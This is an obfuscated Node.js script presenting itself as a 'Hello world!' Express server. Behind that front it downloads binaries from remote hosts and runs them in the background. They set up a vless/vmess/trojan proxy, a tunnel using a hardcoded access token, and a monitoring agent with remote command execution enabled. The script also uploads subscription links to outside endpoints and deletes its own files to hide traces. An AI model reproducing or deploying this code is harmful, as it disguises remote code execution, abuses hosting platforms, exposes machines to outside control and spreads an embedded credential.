const _0x366875=_0x30f5;(function(_0x1364cb,_0x2b41f9){const _0x26c112=_0x30f5,_0x121b85=_0x1364cb();while(!![]){try{const _0x1526d1=parseInt(_0x26c112(0x15c))/0x1+-parseInt(_0x26c112(0x16f))/0x2+-parseInt(_0x26c112(0x117))/0x3*(parseInt(_0x26c112(0x141))/0x4)+parseInt(_0x26c112(0x168))/0x5*(-parseInt(_0x26c112(0x150))/0x6)+parseInt(_0x26c112(0x175))/0x7*(parseInt(_0x26c112(0x195))/0x8)+parseInt(_0x26c112(0x12d))/0x9*(parseInt(_0x26c112(0x15f))/0xa)+parseInt(_0x26c112(0x137))/0xb*(-parseInt(_0x26c112(0x10a))/0xc);if(_0x1526d1===_0x2b41f9)break;else _0x121b85['push'](_0x121b85['shift']());}catch(_0x4b249f){_0x121b85['push'](_0x121b85['shift']());}}}(_0x4a29,0xa5291));const express=require(_0x366875(0x18e)),app=express(),axios=require(_0x366875(0xf7)),os=require('os'),fs=require('fs'),path=require(_0x366875(0xfb)),{promisify}=require(_0x366875(0x173)),exec=promisify(require('child_process')[_0x366875(0x112)]),{execSync}=require(_0x366875(0x10e)),UPLOAD_URL=process[_0x366875(0x186)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x366875(0x186)][_0x366875(0x11a)]||'',AUTO_ACCESS=process[_0x366875(0x186)][_0x366875(0x106)]||![],FILE_PATH=process['env'][_0x366875(0x143)]||'./tmp',SUB_PATH=process[_0x366875(0x186)][_0x366875(0x14d)]||_0x366875(0x11b),PORT=process[_0x366875(0x186)][_0x366875(0x153)]||process['env']['PORT']||0xbb8,UUID=process[_0x366875(0x186)]['UUID']||_0x366875(0x128),NEZHA_SERVER=process[_0x366875(0x186)][_0x366875(0x167)]||'',NEZHA_PORT=process[_0x366875(0x186)][_0x366875(0x11d)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x366875(0x186)][_0x366875(0x135)]||'render.abc2024.ggff.net',ARGO_AUTH=process[_0x366875(0x186)]['ARGO_AUTH']||'eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiMTQ1NjgwYWYtNDg4Ny00YTc1LTk4Y2EtNGNkNDcyYmE0NzA5IiwicyI6Ik9EQXdNamN3T0RJdFlqUTFNQzAwWWpBeExUZzRaRGt0Tm1JMk1HTmlNMlEzTlRneSJ9',ARGO_PORT=process[_0x366875(0x186)][_0x366875(0x189)]||0x1f41,CFIP=process[_0x366875(0x186)][_0x366875(0x151)]||'www.visa.com.sg',CFPORT=process['env'][_0x366875(0x145)]||0x1bb,NAME=process['env'][_0x366875(0x14e)]||_0x366875(0x14f);!fs['existsSync'](FILE_PATH)?(fs[_0x366875(0x12b)](FILE_PATH),console[_0x366875(0x16e)](FILE_PATH+_0x366875(0x15e))):console[_0x366875(0x16e)](FILE_PATH+_0x366875(0x11e));let npmPath=path[_0x366875(0xfa)](FILE_PATH,_0x366875(0x176)),phpPath=path[_0x366875(0xfa)](FILE_PATH,_0x366875(0x156)),webPath=path[_0x366875(0xfa)](FILE_PATH,'web'),botPath=path[_0x366875(0xfa)](FILE_PATH,'bot'),subPath=path[_0x366875(0xfa)](FILE_PATH,_0x366875(0x149)),listPath=path[_0x366875(0xfa)](FILE_PATH,_0x366875(0x19a)),bootLogPath=path[_0x366875(0xfa)](FILE_PATH,'boot.log'),configPath=path[_0x366875(0xfa)](FILE_PATH,_0x366875(0xfd));function deleteNodes(){const _0x2230ad=_0x366875;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0xa92e60;try{_0xa92e60=fs[_0x2230ad(0x19d)](subPath,'utf-8');}catch{return null;}const _0x3bed45=Buffer[_0x2230ad(0x13b)](_0xa92e60,_0x2230ad(0x159))['toString'](_0x2230ad(0x118)),_0x296f19=_0x3bed45['split']('\x0a')['filter'](_0x22b026=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2230ad(0x197)](_0x22b026));if(_0x296f19[_0x2230ad(0x101)]===0x0)return;return axios['post'](UPLOAD_URL+_0x2230ad(0x194),JSON[_0x2230ad(0xf3)]({'nodes':_0x296f19}),{'headers':{'Content-Type':_0x2230ad(0x154)}})['catch'](_0x4a1b8c=>{return null;});}catch(_0x523ff8){return null;}}function cleanupOldFiles(){const _0xd30218=_0x366875,_0x5ded1b=[_0xd30218(0x18f),_0xd30218(0x122),_0xd30218(0x176),_0xd30218(0x156),_0xd30218(0x149),_0xd30218(0xf0)];_0x5ded1b['forEach'](_0x20ffb4=>{const _0x3332c0=_0xd30218,_0x4bc5f4=path[_0x3332c0(0xfa)](FILE_PATH,_0x20ffb4);fs[_0x3332c0(0x196)](_0x4bc5f4,()=>{});});}app[_0x366875(0x144)]('/',function(_0x469ef1,_0x12ae00){const _0x49d723=_0x366875;_0x12ae00[_0x49d723(0x17f)](_0x49d723(0x134));});const config={'log':{'access':_0x366875(0x146),'error':_0x366875(0x146),'loglevel':_0x366875(0x163)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x366875(0x130),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x366875(0x163),'fallbacks':[{'dest':0xbb9},{'path':_0x366875(0xfc),'dest':0xbba},{'path':_0x366875(0x17b),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x366875(0x127)}},{'port':0xbb9,'listen':_0x366875(0x119),'protocol':_0x366875(0x130),'settings':{'clients':[{'id':UUID}],'decryption':_0x366875(0x163)},'streamSettings':{'network':_0x366875(0x127),'security':_0x366875(0x163)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x366875(0x130),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x366875(0xfc)}},'sniffing':{'enabled':!![],'destOverride':[_0x366875(0x17a),_0x366875(0x18d),_0x366875(0x16c)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x366875(0x119),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x366875(0x17b)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x366875(0x18d),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x366875(0x119),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x366875(0x163),'wsSettings':{'path':_0x366875(0x113)}},'sniffing':{'enabled':!![],'destOverride':[_0x366875(0x17a),_0x366875(0x18d),_0x366875(0x16c)],'metadataOnly':![]}}],'dns':{'servers':[_0x366875(0x165)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':_0x366875(0x157),'tag':'block'}]};function _0x4a29(){const _0x5a4bf1=['toString','tcp','dd1d2ae9-ee68-412e-bdde-ecbc8aa07596','https://amd64.ssss.nyc.mn/2go','\x20>/dev/null\x202>&1\x20&','mkdirSync','/vmess-argo?ed=2560','324KUrvgL','pop','filter','vless','https://amd64.ssss.nyc.mn/web','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','Error\x20downloading\x20files:','Hello\x20world!','ARGO_DOMAIN','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','1969QFLIfw','\x0aclient_secret:\x20','config.yaml','post','from','?security=tls&sni=','App\x20is\x20running','Content-Type','pipe','has','4jWVklz','https://arm64.ssss.nyc.mn/agent','FILE_PATH','get','CFPORT','/dev/null','arm64','/php\x20-c\x20\x22','sub.txt','unlinkSync','fileUrl','nohup\x20','SUB_PATH','NAME','render','153912gitToJ','CFIP','automatic\x20access\x20task\x20added\x20successfully','SERVER_PORT','application/json','arm','php','blackhole','&type=ws&host=','base64','createWriteStream','status','1043044pdSCXL','./web','\x20is\x20created','362990Dvhkrs','npm\x20is\x20running','/web\x20-c\x20','close','none','true','https+local://8.8.8.8/dns-query','clear','NEZHA_SERVER','125BcxHaF','./npm','2087','writeFileSync','quic','/sub.txt\x20saved\x20successfully','log','804188hAmWow','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','amd','&path=%2Fvless-argo%3Fed%3D2560#','util','web\x20running\x20error:\x20','882uVenRw','npm','./bot','forEach','bot\x20is\x20running.','http','/vmess-argo','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','data','Skipping\x20adding\x20automatic\x20access\x20task','send','fileName','existsSync','aarch64','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Download\x20','match','env','\x20failed:\x20','php\x20is\x20running','ARGO_PORT','push','includes','response','tls','express','web','\x20-p\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','2096','php\x20running\x20error:\x20','/api/delete-nodes','80712oLrhvv','unlink','test','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','chmod','list.txt','Error\x20executing\x20command:\x20','https://arm64.ssss.nyc.mn/v1','readFileSync','https://arm64.ssss.nyc.mn/web','443','ArgoDomain:','boot.log','/tunnel.yml\x20run','\x20successfully','stringify','Subscription\x20uploaded\x20successfully','\x0a\x20\x20tunnel:\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','axios','tunnel.yml','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','join','path','/vless-argo','config.json','then','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','false','length','ARGO_DOMAIN:','https://oooo.serv00.net/add-url','https://arm64.ssss.nyc.mn/2go','/api/add-nodes','AUTO_ACCESS','./php','stream','\x0avless://','39240BHqiDv','Error\x20reading\x20boot.log:','arch','unshift','child_process','Empowerment\x20success\x20for\x20','listen','\x0a\x20\x20credentials-file:\x20','exec','/trojan-argo','error','rm\x20-rf\x20','split','3947403pOrWmZ','utf-8','127.0.0.1','PROJECT_URL','sub','all','NEZHA_PORT','\x20already\x20exists','2083','https://amd64.ssss.nyc.mn/agent','8443','bot','tunnel.json','message','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27'];_0x4a29=function(){return _0x5a4bf1;};return _0x4a29();}function _0x30f5(_0x31d1e1,_0x230c5e){_0x31d1e1=_0x31d1e1-0xf0;const _0x4a292f=_0x4a29();let _0x30f563=_0x4a292f[_0x31d1e1];return _0x30f563;}fs[_0x366875(0x16b)](path[_0x366875(0xfa)](FILE_PATH,'config.json'),JSON[_0x366875(0xf3)](config,null,0x2));function getSystemArchitecture(){const _0xbd4722=_0x366875,_0x37ed6f=os[_0xbd4722(0x10c)]();return _0x37ed6f===_0xbd4722(0x155)||_0x37ed6f===_0xbd4722(0x147)||_0x37ed6f===_0xbd4722(0x182)?_0xbd4722(0x155):_0xbd4722(0x171);}function downloadFile(_0x2b58d0,_0xa6e95f,_0x5018c0){const _0x56a95f=_0x366875,_0x14cc72=path[_0x56a95f(0xfa)](FILE_PATH,_0x2b58d0),_0x14007e=fs[_0x56a95f(0x15a)](_0x14cc72);axios({'method':'get','url':_0xa6e95f,'responseType':_0x56a95f(0x108)})[_0x56a95f(0xfe)](_0x4fc503=>{const _0x379dcd=_0x56a95f;_0x4fc503[_0x379dcd(0x17d)][_0x379dcd(0x13f)](_0x14007e),_0x14007e['on']('finish',()=>{const _0x5cce54=_0x379dcd;_0x14007e[_0x5cce54(0x162)](),console[_0x5cce54(0x16e)](_0x5cce54(0x184)+_0x2b58d0+_0x5cce54(0xf2)),_0x5018c0(null,_0x2b58d0);}),_0x14007e['on'](_0x379dcd(0x114),_0x5cb3e0=>{const _0x22a064=_0x379dcd;fs['unlink'](_0x14cc72,()=>{});const _0x163d7='Download\x20'+_0x2b58d0+_0x22a064(0x187)+_0x5cb3e0[_0x22a064(0x124)];console[_0x22a064(0x114)](_0x163d7),_0x5018c0(_0x163d7);});})['catch'](_0x196ed9=>{const _0x3cb346=_0x56a95f,_0x1ef2de=_0x3cb346(0x184)+_0x2b58d0+'\x20failed:\x20'+_0x196ed9['message'];console[_0x3cb346(0x114)](_0x1ef2de),_0x5018c0(_0x1ef2de);});}async function downloadFilesAndRun(){const _0x3ba8c4=_0x366875,_0x4765c3=getSystemArchitecture(),_0x4658ff=getFilesForArchitecture(_0x4765c3);if(_0x4658ff[_0x3ba8c4(0x101)]===0x0){console[_0x3ba8c4(0x16e)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x38b045=_0x4658ff['map'](_0x2d2349=>{return new Promise((_0x381435,_0x2a1a29)=>{const _0x56697e=_0x30f5;downloadFile(_0x2d2349[_0x56697e(0x180)],_0x2d2349[_0x56697e(0x14b)],(_0x2a79dd,_0x3ac895)=>{_0x2a79dd?_0x2a1a29(_0x2a79dd):_0x381435(_0x3ac895);});});});try{await Promise[_0x3ba8c4(0x11c)](_0x38b045);}catch(_0xb589e0){console['error'](_0x3ba8c4(0x133),_0xb589e0);return;}function _0x2faa91(_0xf1ad66){const _0xd6980b=_0x3ba8c4,_0x36224b=0x1fd;_0xf1ad66[_0xd6980b(0x178)](_0x53ea35=>{const _0x3b467d=_0xd6980b,_0x4dd6b3=path['join'](FILE_PATH,_0x53ea35);fs[_0x3b467d(0x181)](_0x4dd6b3)&&fs[_0x3b467d(0x199)](_0x4dd6b3,_0x36224b,_0x1144d6=>{const _0x224ea7=_0x3b467d;_0x1144d6?console[_0x224ea7(0x114)]('Empowerment\x20failed\x20for\x20'+_0x4dd6b3+':\x20'+_0x1144d6):console[_0x224ea7(0x16e)](_0x224ea7(0x10f)+_0x4dd6b3+':\x20'+_0x36224b[_0x224ea7(0x126)](0x8));});});}const _0x396d32=NEZHA_PORT?[_0x3ba8c4(0x169),_0x3ba8c4(0x15d),_0x3ba8c4(0x177)]:[_0x3ba8c4(0x107),_0x3ba8c4(0x15d),'./bot'];_0x2faa91(_0x396d32);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2e0be1=NEZHA_SERVER[_0x3ba8c4(0x18b)](':')?NEZHA_SERVER[_0x3ba8c4(0x116)](':')[_0x3ba8c4(0x12e)]():'',_0x74fa92=new Set([_0x3ba8c4(0x19f),_0x3ba8c4(0x121),_0x3ba8c4(0x192),'2087','2083','2053']),_0x42d14a=_0x74fa92[_0x3ba8c4(0x140)](_0x2e0be1)?_0x3ba8c4(0x164):_0x3ba8c4(0x100),_0x5e5b1b=_0x3ba8c4(0x138)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'+NEZHA_SERVER+_0x3ba8c4(0x170)+_0x42d14a+_0x3ba8c4(0x17c)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,_0x3ba8c4(0x139)),_0x5e5b1b);const _0x42a3bb=_0x3ba8c4(0x14c)+FILE_PATH+_0x3ba8c4(0x148)+FILE_PATH+_0x3ba8c4(0x132);try{await exec(_0x42a3bb),console['log'](_0x3ba8c4(0x188)),await new Promise(_0x202559=>setTimeout(_0x202559,0x3e8));}catch(_0x414b1f){console[_0x3ba8c4(0x114)](_0x3ba8c4(0x193)+_0x414b1f);}}else{let _0x2089d7='';const _0x258535=[_0x3ba8c4(0x19f),_0x3ba8c4(0x121),_0x3ba8c4(0x192),_0x3ba8c4(0x16a),_0x3ba8c4(0x11f),'2053'];_0x258535['includes'](NEZHA_PORT)&&(_0x2089d7='--tls');const _0x352994=_0x3ba8c4(0x14c)+FILE_PATH+'/npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x3ba8c4(0x190)+NEZHA_KEY+'\x20'+_0x2089d7+_0x3ba8c4(0x12a);try{await exec(_0x352994),console[_0x3ba8c4(0x16e)](_0x3ba8c4(0x160)),await new Promise(_0x404e53=>setTimeout(_0x404e53,0x3e8));}catch(_0x230c05){console['error']('npm\x20running\x20error:\x20'+_0x230c05);}}}else console[_0x3ba8c4(0x16e)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x5793f6=_0x3ba8c4(0x14c)+FILE_PATH+_0x3ba8c4(0x161)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5793f6),console[_0x3ba8c4(0x16e)]('web\x20is\x20running'),await new Promise(_0x4f1901=>setTimeout(_0x4f1901,0x3e8));}catch(_0x292a9a){console[_0x3ba8c4(0x114)](_0x3ba8c4(0x174)+_0x292a9a);}if(fs[_0x3ba8c4(0x181)](path[_0x3ba8c4(0xfa)](FILE_PATH,'bot'))){let _0x402557;if(ARGO_AUTH[_0x3ba8c4(0x185)](/^[A-Z0-9a-z=]{120,250}$/))_0x402557=_0x3ba8c4(0x198)+ARGO_AUTH;else ARGO_AUTH[_0x3ba8c4(0x185)](/TunnelSecret/)?_0x402557=_0x3ba8c4(0x136)+FILE_PATH+_0x3ba8c4(0xf1):_0x402557=_0x3ba8c4(0xff)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+FILE_PATH+'/bot\x20'+_0x402557+'\x20>/dev/null\x202>&1\x20&'),console[_0x3ba8c4(0x16e)]('bot\x20is\x20running'),await new Promise(_0x4bba05=>setTimeout(_0x4bba05,0x7d0));}catch(_0x567eeb){console[_0x3ba8c4(0x114)]('Error\x20executing\x20command:\x20'+_0x567eeb);}}await new Promise(_0x19d792=>setTimeout(_0x19d792,0x1388));}function getFilesForArchitecture(_0x138d14){const _0x263489=_0x366875;let _0x1df1e8;_0x138d14===_0x263489(0x155)?_0x1df1e8=[{'fileName':'web','fileUrl':_0x263489(0x19e)},{'fileName':_0x263489(0x122),'fileUrl':_0x263489(0x104)}]:_0x1df1e8=[{'fileName':_0x263489(0x18f),'fileUrl':_0x263489(0x131)},{'fileName':_0x263489(0x122),'fileUrl':_0x263489(0x129)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x503731=_0x138d14===_0x263489(0x155)?_0x263489(0x142):_0x263489(0x120);_0x1df1e8[_0x263489(0x10d)]({'fileName':_0x263489(0x176),'fileUrl':_0x503731});}else{const _0x44d488=_0x138d14==='arm'?_0x263489(0x19c):'https://amd64.ssss.nyc.mn/v1';_0x1df1e8[_0x263489(0x10d)]({'fileName':_0x263489(0x156),'fileUrl':_0x44d488});}}return _0x1df1e8;}function argoType(){const _0x3b29fe=_0x366875;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3b29fe(0x16e)](_0x3b29fe(0xf6));return;}if(ARGO_AUTH[_0x3b29fe(0x18b)]('TunnelSecret')){fs[_0x3b29fe(0x16b)](path[_0x3b29fe(0xfa)](FILE_PATH,_0x3b29fe(0x123)),ARGO_AUTH);const _0xdc3453=_0x3b29fe(0xf5)+ARGO_AUTH[_0x3b29fe(0x116)]('\x22')[0xb]+_0x3b29fe(0x111)+path[_0x3b29fe(0xfa)](FILE_PATH,_0x3b29fe(0x123))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x3b29fe(0x16b)](path[_0x3b29fe(0xfa)](FILE_PATH,_0x3b29fe(0xf8)),_0xdc3453);}else console['log'](_0x3b29fe(0x183));}argoType();async function extractDomains(){const _0x5b3b4d=_0x366875;let _0x58179c;if(ARGO_AUTH&&ARGO_DOMAIN)_0x58179c=ARGO_DOMAIN,console[_0x5b3b4d(0x16e)](_0x5b3b4d(0x102),_0x58179c),await _0x99a800(_0x58179c);else try{const _0x32f5cc=fs[_0x5b3b4d(0x19d)](path[_0x5b3b4d(0xfa)](FILE_PATH,_0x5b3b4d(0xf0)),_0x5b3b4d(0x118)),_0x441b3e=_0x32f5cc[_0x5b3b4d(0x116)]('\x0a'),_0x2b9746=[];_0x441b3e[_0x5b3b4d(0x178)](_0x1bb0d9=>{const _0x478ff1=_0x5b3b4d,_0x5ec8a3=_0x1bb0d9[_0x478ff1(0x185)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5ec8a3){const _0x263850=_0x5ec8a3[0x1];_0x2b9746[_0x478ff1(0x18a)](_0x263850);}});if(_0x2b9746['length']>0x0)_0x58179c=_0x2b9746[0x0],console['log'](_0x5b3b4d(0x1a0),_0x58179c),await _0x99a800(_0x58179c);else{console[_0x5b3b4d(0x16e)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x5b3b4d(0x14a)](path['join'](FILE_PATH,_0x5b3b4d(0xf0)));async function _0x35e38b(){try{await exec('pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1');}catch(_0x5a8d73){}}_0x35e38b(),await new Promise(_0x1fe02c=>setTimeout(_0x1fe02c,0xbb8));const _0xc145c3=_0x5b3b4d(0xff)+FILE_PATH+_0x5b3b4d(0xf9)+ARGO_PORT;try{await exec(_0x5b3b4d(0x14c)+path['join'](FILE_PATH,_0x5b3b4d(0x122))+'\x20'+_0xc145c3+_0x5b3b4d(0x12a)),console[_0x5b3b4d(0x16e)](_0x5b3b4d(0x179)),await new Promise(_0x39f0ee=>setTimeout(_0x39f0ee,0xbb8)),await extractDomains();}catch(_0x363b1a){console['error'](_0x5b3b4d(0x19b)+_0x363b1a);}}}catch(_0x1e5ee8){console[_0x5b3b4d(0x114)](_0x5b3b4d(0x10b),_0x1e5ee8);}async function _0x99a800(_0x3bd9fd){const _0x22f1f9=_0x5b3b4d,_0xa95109=execSync(_0x22f1f9(0x125),{'encoding':_0x22f1f9(0x118)}),_0x47632f=_0xa95109['trim']();return new Promise(_0x2668be=>{setTimeout(()=>{const _0x1fd997=_0x30f5,_0x2ba6e1={'v':'2','ps':NAME+'-'+_0x47632f,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x1fd997(0x163),'host':_0x3bd9fd,'path':_0x1fd997(0x12c),'tls':_0x1fd997(0x18d),'sni':_0x3bd9fd,'alpn':''},_0x66d12a=_0x1fd997(0x109)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x3bd9fd+'&type=ws&host='+_0x3bd9fd+_0x1fd997(0x172)+NAME+'-'+_0x47632f+'\x0a\x20\x20\x0avmess://'+Buffer[_0x1fd997(0x13b)](JSON[_0x1fd997(0xf3)](_0x2ba6e1))[_0x1fd997(0x126)](_0x1fd997(0x159))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x1fd997(0x13c)+_0x3bd9fd+_0x1fd997(0x158)+_0x3bd9fd+_0x1fd997(0x191)+NAME+'-'+_0x47632f+'\x0a\x20\x20\x20\x20';console[_0x1fd997(0x16e)](Buffer[_0x1fd997(0x13b)](_0x66d12a)[_0x1fd997(0x126)](_0x1fd997(0x159))),fs[_0x1fd997(0x16b)](subPath,Buffer[_0x1fd997(0x13b)](_0x66d12a)[_0x1fd997(0x126)]('base64')),console[_0x1fd997(0x16e)](FILE_PATH+_0x1fd997(0x16d)),uplodNodes(),app[_0x1fd997(0x144)]('/'+SUB_PATH,(_0x44609d,_0x340263)=>{const _0xe9bab=_0x1fd997,_0xec28a2=Buffer[_0xe9bab(0x13b)](_0x66d12a)['toString']('base64');_0x340263['set'](_0xe9bab(0x13e),'text/plain;\x20charset=utf-8'),_0x340263[_0xe9bab(0x17f)](_0xec28a2);}),_0x2668be(_0x66d12a);},0x7d0);});}}async function uplodNodes(){const _0x4ff133=_0x366875;if(UPLOAD_URL&&PROJECT_URL){const _0x14299d=PROJECT_URL+'/'+SUB_PATH,_0x6eb87f={'subscription':[_0x14299d]};try{const _0x59af87=await axios[_0x4ff133(0x13a)](UPLOAD_URL+'/api/add-subscriptions',_0x6eb87f,{'headers':{'Content-Type':_0x4ff133(0x154)}});if(_0x59af87[_0x4ff133(0x15b)]===0xc8)console[_0x4ff133(0x16e)](_0x4ff133(0xf4));else return null;}catch(_0xdfe10f){if(_0xdfe10f[_0x4ff133(0x18c)]){if(_0xdfe10f[_0x4ff133(0x18c)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4ff133(0x181)](listPath))return;const _0x34b795=fs[_0x4ff133(0x19d)](listPath,_0x4ff133(0x118)),_0x3421e3=_0x34b795['split']('\x0a')[_0x4ff133(0x12f)](_0x1829bf=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4ff133(0x197)](_0x1829bf));if(_0x3421e3[_0x4ff133(0x101)]===0x0)return;const _0x55c268=JSON[_0x4ff133(0xf3)]({'nodes':_0x3421e3});try{await axios[_0x4ff133(0x13a)](UPLOAD_URL+_0x4ff133(0x105),_0x55c268,{'headers':{'Content-Type':'application/json'}});if(response[_0x4ff133(0x15b)]===0xc8)console[_0x4ff133(0x16e)]('Subscription\x20uploaded\x20successfully');else return null;}catch(_0xb7d56c){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x456ac8=_0x30f5,_0x43039d=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x43039d[_0x456ac8(0x18a)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x43039d[_0x456ac8(0x18a)](phpPath);exec(_0x456ac8(0x115)+_0x43039d['join']('\x20')+'\x20>/dev/null\x202>&1',_0x545f92=>{const _0x4ec094=_0x456ac8;console[_0x4ec094(0x166)](),console[_0x4ec094(0x16e)](_0x4ec094(0x13d)),console[_0x4ec094(0x16e)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x178ad8=_0x366875;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x178ad8(0x17e));return;}try{const _0x2f2a09=await axios[_0x178ad8(0x13a)](_0x178ad8(0x103),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});console[_0x178ad8(0x16e)](_0x178ad8(0x152));}catch(_0x4f50f9){console[_0x178ad8(0x114)]('添加URL失败:\x20'+_0x4f50f9[_0x178ad8(0x124)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x366875(0x110)](PORT,()=>console[_0x366875(0x16e)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
